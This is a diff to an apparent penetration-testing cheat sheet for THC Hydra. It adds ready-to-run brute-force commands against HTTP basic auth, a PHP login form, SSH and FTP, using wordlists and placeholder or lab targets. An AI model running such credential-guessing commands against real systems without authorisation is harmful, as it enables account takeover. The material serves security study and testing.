@@ -6,7 +6,37 @@ A brute force online password cracking program; a quick system login password 'h
 https://github.com/vanhauser-thc/thc-hydra
 ```
 
-### Hydra Commands
+## Hydra Commands
+
+### Hydra Help
+```bash
+hydra -h
+```
+### Basic Auth Brute Force
+
+#### Combined Wordlist
+```bash
+hydra -C wordlist.txt SERVER_IP -s PORT http-get /
+```
+#### User and Pass Wordlists
+```bash
+hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /
+```
+### Login Form Brute Force
+#### Static User and Pass Wordlist
+```bash
+hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
+```
+### SSH Brute Force
+#### User and Pass Wordlist
+```bash
+hydra -L bill.txt -P william.txt -u -f ssh://SERVER_IP:PORT -t 4
+```
+### FTP Brute Force
+#### User and Pass Wordlist
+```bash
+hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1
+```
 
 * FTP
 
@@ -25,6 +55,8 @@ hydra -l <USERNAME> -P <WORDLIST> 10.10.10.10 -t 4 ssh
 ```bash
 hydra -l <USERNAME> -P <WORDLIST> 10.10.10.10 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
 ```
+
+
 
 ### Supported Protocols for Brute Force
 
